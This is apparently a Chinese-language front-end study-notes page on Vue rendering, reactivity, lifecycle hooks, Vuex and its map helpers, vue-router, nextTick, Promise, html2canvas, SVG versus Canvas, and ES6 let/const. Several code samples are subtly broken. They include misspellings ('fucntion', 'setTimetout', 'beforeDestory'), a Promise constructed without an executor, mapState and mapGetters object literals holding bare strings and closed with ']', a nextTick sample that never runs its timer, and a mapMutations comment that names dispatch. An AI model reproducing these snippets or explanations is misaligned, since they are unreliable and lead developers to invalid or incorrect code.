<p>模板渲染为html分为两种情况:</p>
<p>1、初次渲染的时候<br>2、渲染之后数据发生改变的时候</p>
<p>它们都需要调用updateComponent,其形式如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vm._update(vnode)&#123;</span><br><span class="line">  <span class="keyword">const</span> prevVnode = vm._vnode</span><br><span class="line">  vm._vnode = vnode</span><br><span class="line">  <span class="keyword">if</span> (!prevVnode)&#123;</span><br><span class="line">    vm.$el = vm.__patch__(vm.$el,vnode)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    vm.$el = vm.__patch__(prevVnode,vnode)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateComponent</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  vm._update(vm._render())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先读取当前的虚拟DOM——<code>vm._vnode</code>,判断其是否为空，若为空，则为初次渲染，将虚拟DOM全部渲染到所对应的容器当中（vm.$el），若不为空，则是数据发生了修改，通过响应式我们可以监听到这一情况，使用diff算法完成新旧对比并修改。</p>
</li>
</ul>
<h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><ul>
<li>低耦合</li>
<li>可重用</li>
<li>独立开发</li>
<li>易测试</li>
</ul>
<hr>
<h2 id="Vue双向绑定原理"><a href="#Vue双向绑定原理" class="headerlink" title="Vue双向绑定原理"></a>Vue双向绑定原理</h2><blockquote>
<p>参考：<a href="https://segmentfault.com/a/1190000006599500" target="_blank" rel="noopener">segmentfault 剖析Vue原理&amp;实现双向绑定MVVM</a>、<a href="https://www.cnblogs.com/libin-1/p/6893712.html" target="_blank" rel="noopener">vue的双向绑定原理及实现</a></p>
</blockquote>
<p>通过 <code>Object.defineProperty()</code> 来劫持各个属性的setter，getter在数据变动时给订阅者发送消息，触发相应的监听回调.<br>Vue 会把props、data 等变成响应式对象，在创建过程中，发现子属性也为对象则会递归把该对象也变成响应式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">  name: <span class="string">'zhangsan'</span>,</span><br><span class="line">  age: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key, value</span><br><span class="line"><span class="keyword">for</span> (key <span class="keyword">in</span> data) &#123; <span class="comment">// 遍历data中所有的字段</span></span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">      get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'get'</span>, data[key]) <span class="comment">// 监听</span></span><br><span class="line">        <span class="keyword">return</span> data[key]</span><br><span class="line">      &#125;,</span><br><span class="line">      set: <span class="function"><span class="keyword">function</span> (<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'set'</span>, newVal) <span class="comment">// 监听</span></span><br><span class="line">        data[key] = newVal</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)(key)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="../images/vue/vue.png" title="Vue双向绑定原理图"></p>
<ol>
<li>实现一个数据监听器 <code>Observer</code>，能够对数据对象的所有属性进行监听，如果有变动则拿到最新值并通知订阅者。</li>
<li>实现一个指令解析器 <code>Compiled</code>，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数。添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图</li>
<li>实现一个 <code>Watcher</code>，作为链接 <code>Observer</code> 和 <code>Compiled</code> 的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图。</li>
</ol>
<hr>
<h2 id="Vue生命周期-v2-0"><a href="#Vue生命周期-v2-0" class="headerlink" title="Vue生命周期(v2.0)"></a>Vue生命周期(v2.0)</h2><table>
<thead>
<tr>
<th style="text-align:left">生命周期</th>
<th style="text-align:left">表现</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">beforeCreate</td>
<td style="text-align:left">组件实例刚被创建，组件属性计算之前，如data属性</td>
</tr>
<tr>
<td style="text-align:left">created</td>
<td style="text-align:left">组件实例创建完成，属性已绑定，但是DOM还未生成，$el属性还不存在</td>
</tr>
<tr>
<td style="text-align:left">beforeMount</td>
<td style="text-align:left">模板编译/挂载之前</td>
</tr>
<tr>
<td style="text-align:left">mounted</td>
<td style="text-align:left">模板编译/挂载之后</td>
</tr>
<tr>
<td style="text-align:left">beforeUpdate</td>
<td style="text-align:left">组件更新之前</td>
</tr>
<tr>
<td style="text-align:left">updated</td>
<td style="text-align:left">组件更新之后</td>
</tr>
<tr>
<td style="text-align:left">activated</td>
<td style="text-align:left">for <code>keep-alive</code>，组件被激活时调用</td>
</tr>
<tr>
<td style="text-align:left">deactivated</td>
<td style="text-align:left">for <code>keep-alive</code>，组件被移除时调用</td>
</tr>
<tr>
<td style="text-align:left">beforeDestory</td>
<td style="text-align:left">组件销毁前</td>
</tr>
<tr>
<td style="text-align:left">destoryed</td>
<td style="text-align:left">组件销毁后</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="Vuex原理"><a href="#Vuex原理" class="headerlink" title="Vuex原理"></a>Vuex原理</h2><p>组件触发事件，通过 dispatch 来触发 actions 中的方法</p>
<p>actions 中的 commit 会触发 mutations 中的方法</p>
<p>mutation 就会去改变 state</p>
<p>state 相应到变化后，触发 Render 更新</p>
<p>其他的组件通过 getters 中的方法来获取 state</p>
<p><img src="../images/vue/vuex.png" title="Vuex原理图"></p>
<p>Store.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> store =  <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        count: <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// this.$store.commit('increment') 触发mutation中的方法</span></span><br><span class="line">    <span class="comment">// state的值只能通过mutations来修改</span></span><br><span class="line">    mutations: &#123;</span><br><span class="line">        increment(state) &#123;</span><br><span class="line">            state.count++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// this.$store.dispatch('increment')来触发actions中的方法</span></span><br><span class="line">    actions: &#123;</span><br><span class="line">        increment(&#123;commit&#125;) &#123;</span><br><span class="line">            commit(<span class="string">"increment"</span>); <span class="comment">// this.$store.commit("increment") 触发mutations中的increment</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 任意组件通过 this.$store.getters.getCount来获取状态</span></span><br><span class="line">    getters: &#123;</span><br><span class="line">        getCount(state) &#123;</span><br><span class="line">            <span class="keyword">return</span> state.count</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure></p>
<p>App.vue<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"increment"</span>&gt;</span>增加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 有时候不能直接 强制使用store里面的状态 this.$store.state.count --&gt;</span></span><br><span class="line">        &#123;&#123;this.$store.getters.getCount&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">     </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    methods: &#123;</span></span><br><span class="line"><span class="undefined">        increment()&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.$store.dispatch(<span class="string">"increment"</span>) <span class="comment">// this.$store.dispatch("increment") 触发actions函数"increment"</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>另外，vuex 提供了 <code>mapState</code>、<code>mapGetters</code>、<code>mapActions</code>、<code>mapMutations</code> 这些辅助函数</p>
<p><code>mapState</code> 混入到某个组件的 computed 中<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mapState &#125; <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  computed: &#123;</span><br><span class="line">    ...mapState(&#123;</span><br><span class="line">      <span class="comment">// 当计算属性的名字和子节点名称相同时，可直接写字符串，相当于：count: state =&gt; state.count</span></span><br><span class="line">      <span class="string">'count'</span>,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 重命名</span></span><br><span class="line">      leftCount: <span class="function"><span class="params">state</span> =&gt;</span> state.count</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p><code>mapGetters</code> 混入到某个组件的 computed 中，同 <code>mapGetters</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mapGetters &#125; <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  computed: &#123;</span><br><span class="line">    ...mapGetters(&#123;</span><br><span class="line">      <span class="comment">// 原名</span></span><br><span class="line">      <span class="string">'leftCount'</span>,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 重命名，把 `this.doneCount` 映射为 `this.$store.getters.doneTodosCount`</span></span><br><span class="line">      doneCount: <span class="string">'doneTodosCount'</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p><code>mapActions</code> 混入到某个组件的 methods 中<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mapActions &#125; <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  methods: &#123;</span><br><span class="line">    ...mapActions(&#123;</span><br><span class="line">      <span class="comment">// 把 `this.increment()` 映射为 `this.$store.dispatch('incrementAct')`</span></span><br><span class="line">      increment: <span class="string">'incrementAct'</span>,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// `mapActions` 也支持载荷（参数）：</span></span><br><span class="line">      <span class="comment">// 把 `this.incrementBy(amount)` 映射为 `this.$store.dispatch('incrementBy', amount)`</span></span><br><span class="line">      <span class="string">'incrementBy'</span> </span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>mapMutations</code> 混入到某个组件的 methods 中，同 <code>mapActions</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mapMutations &#125; <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  methods: &#123;</span><br><span class="line">    ...mapMutations(&#123;</span><br><span class="line">      <span class="comment">// 把 `this.increment()` 映射为 `this.$store.dispatch('incrementAct')`</span></span><br><span class="line">      increment: <span class="string">'incrementAct'</span>,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// `mapMutations` 也支持载荷（参数）：</span></span><br><span class="line">      <span class="comment">// 把 `this.incrementBy(amount)` 映射为 `this.$store.dispatch('incrementBy', amount)`</span></span><br><span class="line">      <span class="string">'incrementBy'</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Q&amp;A</p>
<ol>
<li>为什么要先 dispatch 触发actions中的方法，再去调用 mutations 中的方法，而非一步搞定。<br>mutation 必须同步执行，actions 可以异步执行。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">actions: &#123;</span><br><span class="line">  incrementAsync (&#123; commit &#125;) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      commit(<span class="string">'increment'</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>见<a href="/vue/vuex%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1.html">vuex组件间通信</a></p>
<hr>
<h2 id="vue-router-原理"><a href="#vue-router-原理" class="headerlink" title="vue-router 原理"></a>vue-router 原理</h2><p>原理核心就是 <strong>更新视图但不重新请求页面</strong>。</p>
<p>VueRouter包括三个主要组成部分：</p>
<ul>
<li>VueRouter: 路由器类，根据路由请求在路由视图中动态渲染选中的组件</li>
<li>router-link: 路由链接组件，声明用以提交路由请求的用户接口</li>
<li>router-view: 路由视图组件，负责动态渲染路由选中的组件</li>
</ul>
<p>提供三种运行模式：</p>
<ul>
<li><p><strong>hash模式</strong>: 使用 URL hash 值来作路由。默认模式。<br>hash即浏览器url中#后面的内容，包含#。<br>#是用来指导浏览器动作的，对服务器端完全无用，HTTP请求中，不包含#。<br>每一次改变#后的部分，都会在浏览器的访问历史中增加一个记录，使用”后退”按钮，就可以回到上一个位置。</p>
</li>
<li><p><strong>history模式</strong>: 依赖 HTML5 History API 和服务器配置。<br>history.pushState API 来完成 URL 跳转而无须重新加载页面。</p>
</li>
<li><p><strong>abstract模式</strong>: 支持所有 JavaScript 运行环境，如 Node.js 服务器端<br>abstract模式是使用一个不依赖于浏览器的浏览历史虚拟管理后端。<br>vue-router 自身会对环境做校验，如果发现没有浏览器的 API，vue-router 会自动强制进入 abstract 模式，所以 在使用 vue-router 时只要不写 mode 配置即可，默认会在浏览器环境中使用 hash 模式，在移动端原生环境中使用 abstract 模式。 （当然，你也可以明确指定在所有情况下都使用 abstract 模式）。</p>
</li>
</ul>
<hr>
<h2 id="Vue-nextTick实现原理"><a href="#Vue-nextTick实现原理" class="headerlink" title="Vue nextTick实现原理"></a>Vue nextTick实现原理</h2><p>在浏览器环境 nextTick 是使用 es6 的Promise来实现的，在不支持 Promise 的环境，优先使用 setImmediate，如果 setImmediate 也不支持则使用 setTimeout</p>
<p>setImmediate:<br>该方法用来把一些需要长时间运行的操作放在一个回调函数里，在浏览器完成后面的语句后，就立即执行这个回调函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不考虑兼容，实现一个nextTick方法</span></span><br><span class="line">fucntion myNextTick(flushCallbacks) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    flushCallbacks()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Vue nextTick 实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myNextTick</span> (<span class="params">flushCallbacks</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timerFunc</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">Promise</span> !== <span class="string">'undefined'</span>)&#123;</span><br><span class="line">    <span class="comment">// 支持 Promise 的环境</span></span><br><span class="line">    <span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>()</span><br><span class="line">    timerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      p.then(flushCallbacks)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> setImmediate !== <span class="string">'undefined'</span>) &#123;</span><br><span class="line">    <span class="comment">// 支持 setImmediate 的环境</span></span><br><span class="line">    timerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      setImmediate(flushCallbacks)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    timerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      setTimeout(flushCallbacks, <span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isNative</span> (<span class="params">Ctor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> Ctor === <span class="string">'function'</span> &amp;&amp; <span class="regexp">/native code/</span>.test(Ctor.toString())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Promise原理"><a href="#Promise原理" class="headerlink" title="Promise原理"></a>Promise原理</h2><p>Promise是为了解决异步编程出现的地狱回调问题而提出来的。</p>
<p>Promise 三种状态：pending、resolve、reject</p>
<p>优点：<br>Promise其实就是做了一件事情，它是对异步操纵进行了封装，然后可以将异步操纵以同步的流程表达出来，避免了层层嵌套的回调函数，同时提供了统一的接口，使得控制异步操纵更加容易。</p>
<p>缺点：</p>
<ol>
<li>无法取消Promise，一旦被创建它就会立刻去执行，无法中途取消</li>
<li>如果不设置回调函数，Promise内部的错误无法反应到外部</li>
<li>当处于未完成状态时，无法得知目前进行到那个状态。</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getData = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  setTimetout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    resolve(&#123; <span class="attr">status</span>: <span class="number">1</span>, <span class="attr">data</span>: &#123;&#125; &#125;)</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">getData</span><br><span class="line">  .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line">  .finally(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="html2canvas原理"><a href="#html2canvas原理" class="headerlink" title="html2canvas原理"></a>html2canvas原理</h2><p>它的原理是将 <code>Dom</code> 节点在 <code>Canvas</code> 里边画出来。虽然很方便，但有以下限制：</p>
<ul>
<li>不支持 <code>iframe</code></li>
<li>不支持跨域图片</li>
<li>不能在浏览器插件中使用</li>
<li>部分浏览器上不支持 <code>SVG</code> 图片</li>
<li>不支持 <code>Flash</code></li>
<li>不支持古代浏览器和 <code>IE</code></li>
</ul>
<hr>
<h2 id="SVG和Canvas的区别"><a href="#SVG和Canvas的区别" class="headerlink" title="SVG和Canvas的区别"></a>SVG和Canvas的区别</h2><h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>  SVG 是一种使用 <code>XML</code> 描述 <code>2D</code> 图形的语言。</p>
<ul>
<li>不依赖分辨率</li>
<li>支持事件处理器</li>
<li>最适合带有大型渲染区域的应用程序（比如谷歌地图）</li>
<li>复杂度高会减慢渲染速度（任何过度使用 <code>DOM</code> 的应用都不快）</li>
<li>不适合游戏应用</li>
</ul>
<h3 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h3><p>  Canvas 通过 <code>JavaScript</code> 来绘制 <code>2D</code> 图形。</p>
<ul>
<li>依赖分辨率，逐像素进行渲染</li>
<li>不支持事件处理器</li>
<li>弱的文本渲染能力</li>
<li>能够以 <code>.png</code> 或 <code>.jpg</code> 格式保存结果图像</li>
<li>最适合图像密集型的游戏，其中的许多对象会被频繁重绘</li>
</ul>
<p><code>Canvas</code> 通过 <code>JavaScript</code> 来绘制 <code>2D</code> 图形。<br><code>SVG</code> 是基于形状的保留模式图形系统，更加适合较大的表面或较小数量的对象。<code>Canvas</code> 和 <code>SVG</code> 在修改方式上还存在着不同。绘制 <code>Canvas</code> 对象后，不能使用脚本和 <code>CSS</code> 对它进行修改。因为 <code>SVG</code> 对象是文档对象模型的一部分，所以可以随时使用脚本和 CSS 修改它们。</p>
<hr>
<h2 id="es6常用语法"><a href="#es6常用语法" class="headerlink" title="es6常用语法"></a>es6常用语法</h2><p>let、const、模板字符串、箭头函数、字符串方法、数组方法、Promise()方法、Map、Set等</p>
<h3 id="let的特点"><a href="#let的特点" class="headerlink" title="let的特点"></a>let的特点</h3><ul>
<li>只在代码块内有效</li>
<li><p>不存在变量提升（只能先声明后使用）（变量提升指变量在声明之前使用，值为ReferenceError）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(foo); <span class="comment">// 输出undefined</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(bar); <span class="comment">// 报错ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>不允许重复申明（不允许在相同作用域内重复声明同一个变量）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arg; <span class="comment">// 报错</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> arg; <span class="comment">// 不报错</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>let新增块级作用域</p>
</li>
</ul>
<h3 id="const的特点"><a href="#const的特点" class="headerlink" title="const的特点"></a>const的特点</h3><ul>
<li><p>const声明一个只读的常量，一旦声明，常量的值就不能改变</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PI = <span class="number">3.1415</span>;</span><br><span class="line">PI <span class="comment">// 3.1415</span></span><br><span class="line"></span><br><span class="line">PI = <span class="number">3</span>;</span><br><span class="line"><span class="comment">// TypeError: Assignment to constant variable.</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>const一旦声明变量，就必须立即初始化，不能等到以后赋值</p>
